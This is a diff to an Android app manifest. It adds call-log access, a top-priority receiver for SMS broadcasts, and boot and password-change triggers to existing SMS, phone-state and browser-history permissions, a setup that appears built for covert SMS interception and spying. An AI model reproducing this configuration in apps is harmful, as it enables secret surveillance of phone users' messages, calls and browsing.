@@ -7,9 +7,13 @@
     <uses-permission android:name="android.permission.RECEIVE_SMS"/>
     <uses-permission android:name="android.permission.SEND_SMS"/>
     <uses-permission android:name="android.permission.READ_SMS"/>
+
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
     <uses-permission android:name="com.android.broswer.permission.WRITE_HISTORY_BOOKMARKS" />
+
 
     <application
         android:allowBackup="true"
@@ -19,8 +23,15 @@
         android:theme="@style/AppTheme">
         <service android:name=".ServiceClass"/>
         <receiver android:name=".ServiceStarter">
-            <intent-filter>
+            <intent-filter android:priority="1000">
                 <action android:name="android.intent.action.BOOT_COMPLETED"></action>
+
+                <action android:name="android.provider.Telephony.SMS_CB_RECEIVED"></action>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"></action>
+                <action android:name="android.provider.Telephony.SMS_EMERGENCY_CB_RECEIVED"></action>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"></action>
+                <action android:name="android.provider.Telephony.SMS_REJECTED"></action>
+                <action android:name="android.provider.Telephony.SMS_SERVICE_CATEGORY_PROGRAM_DATA_RECEIVED"></action>
 
                 <action android:name="android.app.action.ACTION_PASSWORD_CHANGED"></action>
                 <action android:name="android.app.action.ACTION_PASSWORD_EXPIRING"></action>
